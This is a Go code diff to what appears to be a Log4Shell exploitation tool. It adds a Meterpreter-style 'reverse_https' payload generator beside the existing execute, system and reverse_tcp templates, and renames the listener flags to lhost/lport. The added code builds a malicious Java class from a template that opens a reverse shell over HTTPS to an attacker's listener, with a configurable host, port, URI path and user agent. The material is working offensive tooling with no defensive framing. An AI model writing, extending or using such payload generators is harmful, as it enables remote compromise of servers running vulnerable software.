@@ -144,8 +144,10 @@ func generateClass() {
 		generateSystem()
 	case "reverse_tcp":
 		generateReverseTCP()
+	case "reverse_https":
+		generateReverseHTTPS()
 	default:
-		fmt.Println("supported Java class template: execute, system, reverse_tcp")
+		fmt.Println("supported Java class template: execute, system, reverse_tcp, reverse_https")
 		fmt.Println()
 		log.Fatalf("[error] unknown Java class template name: \"%s\"\n", genClass)
 	}
@@ -220,8 +222,8 @@ func generateReverseTCP() {
 		host string
 		port uint
 	)
-	args.StringVar(&host, "host", "", "listener host")
-	args.UintVar(&port, "port", 4444, "listener port")
+	args.StringVar(&host, "lhost", "", "listener host")
+	args.UintVar(&port, "lport", 4444, "listener port")
 	_ = args.Parse(log4shell.CommandLineToArgs(genArgs))
 
 	if host == "" {
@@ -240,6 +242,45 @@ func generateReverseTCP() {
 	}
 
 	data, err := log4shell.GenerateReverseTCP(template, host, uint16(port), "", gnClass)
+	checkError(err)
+	err = os.WriteFile(genOut, data, 0600)
+	checkError(err)
+}
+
+func generateReverseHTTPS() {
+	template, err := os.ReadFile("template/ReverseHTTPS.class")
+	checkError(err)
+
+	args := flag.NewFlagSet("meterpreter/reverse_https", flag.ExitOnError)
+	args.SetOutput(os.Stdout)
+	var (
+		host string
+		port uint
+		uri  string
+		ua   string
+	)
+	args.StringVar(&host, "lhost", "", "listener host")
+	args.UintVar(&port, "lport", 8443, "listener port")
+	args.StringVar(&uri, "luri", "", "http path")
+	args.StringVar(&ua, "ua", "", "user agent")
+	_ = args.Parse(log4shell.CommandLineToArgs(genArgs))
+
+	if host == "" {
+		args.PrintDefaults()
+		os.Exit(2)
+	}
+	if port > 65535 {
+		fmt.Println("[error]", "invalid port:", port)
+		os.Exit(2)
+	}
+	if gnClass == "" {
+		gnClass = "ReverseHTTPS"
+	}
+	if genOut == "" {
+		genOut = filepath.Join(config.PayloadDir, gnClass+".class")
+	}
+
+	data, err := log4shell.GenerateReverseHTTPS(template, host, uint16(port), uri, ua, "", gnClass)
 	checkError(err)
 	err = os.WriteFile(genOut, data, 0600)
 	checkError(err)
